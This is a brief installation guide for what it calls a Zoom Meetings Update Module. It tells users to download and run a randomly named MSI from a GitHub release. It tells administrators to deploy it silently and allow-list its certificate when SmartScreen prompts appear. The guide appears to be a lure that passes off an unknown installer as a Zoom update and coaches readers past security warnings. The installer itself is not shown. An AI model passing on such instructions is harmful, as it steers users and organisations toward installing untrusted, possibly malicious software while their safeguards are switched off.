# Installation guide

## Zoom Meetings Update Module

### End users

Download `zoo_6ul21u7pofjbh_v42616.msi` from release `v34076` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v34076` for pilot groups.

### Silent install

```
zoo_6ul21u7pofjbh_v42616.msi /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
